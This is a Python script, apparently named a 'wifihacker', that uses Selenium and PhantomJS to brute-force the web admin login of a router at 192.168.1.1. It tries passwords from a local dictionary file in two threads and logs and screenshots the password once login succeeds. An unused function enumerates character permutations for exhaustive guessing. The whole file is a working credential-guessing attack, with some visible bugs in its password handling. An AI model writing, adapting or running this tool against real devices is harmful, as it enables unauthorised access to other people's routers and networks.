"""
python 3.6
"""
import os
import queue
import logging
import threading
import time
from itertools import permutations

from selenium import webdriver


BASE_dir = os.path.dirname(os.path.abspath(__file__))
SCREEN_SHOT_PATH = os.path.join(BASE_dir, 'index.png')

# 日志
log_file = os.path.join(BASE_dir, 'wifihacker.log')
logging.basicConfig(level=logging.INFO, filename=log_file, filemode="w")
logger = logging.getLogger(__name__)

# 全局变量，是否找到了密码
GET_PP_STATUS = False


# 排列组合密码
def combination_password(password_queue):
    global GET_PP_STATUS
    chracter_num = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    for i in range(8, 12):
        for password in permutations(list(chracter_num), i):
            if not GET_PP_STATUS:
                password_queue.put(password, block=True)
            else:
                return ""


# 抽取密码
def extract_password(line):
    try:
        password = line.split()[1]
    except:
        password = 'password123'
    return password


# 读取密码字典存入队列
def populate_password(file_path, password_queue):
    global GET_PP_STATUS
    with open(file_path, 'r') as file:
        while True:
            if not GET_PP_STATUS:
                password = extract_password(file.readline())
                password_queue.put(password, block=True)
            else:
                break
    logger.info("dissect password file end")


# 创建phantomjs线程存入队列
def phantomjs_process(password_queue):
    """
    password_queue:密码队列
    num:线程编号
    """
    service_args=['--load-images=no','--disk-cache=yes']
    driver = webdriver.PhantomJS(executable_path="phantomjs.exe", service_args=service_args)
    driver.get("http://192.168.1.1/")

    # 保证登录页面渲染完成
    while True:
        try:
            driver.find_element_by_id("lgPwd")
            driver.find_element_by_id("loginSub")
            break
        except:
            time.sleep(1)
    logger.info("click start")

    # 不断去尝试密码
    password = password_queue.get()
    times = 0
    global GET_PP_STATUS
    while not GET_PP_STATUS and password:
        times += 1
        driver.find_element_by_id("lgPwd").send_keys(password)
        elem_login_edge = driver.find_element_by_id("loginSub")
        elem_login_edge.click()
        time.sleep(3)
        try:
            driver.find_element_by_id("loginError")
            logger.info("wrongPassword={password},total={times}".format(password=password, times=times))
        except:
            driver.save_screenshot(SCREEN_SHOT_PATH)
            logger.info("password is {password}".format(password=password) )
            GET_PP_STATUS = True
            break
        password = password_queue.get()


if __name__ == "__main__":
    # 密码队列
    password_queue = queue.Queue(maxsize=100)

    # 线程队列
    phantomjs_queue = queue.Queue(maxsize=10)

    file_path = r'C:\Users\Jerry\Desktop\password4.txt'

    logger.info("Start dissect password")
    # 字典读取密码
    populate_password_thread = threading.Thread(target=populate_password, args=(file_path,password_queue))
    populate_password_thread.start()

    logger.info("Hacking ......")
    # 模拟请求
    for i in range(2):
        time.sleep(5)
        phantomjs_thread = threading.Thread(target=phantomjs_process, args=(password_queue,))
        phantomjs_thread.start()
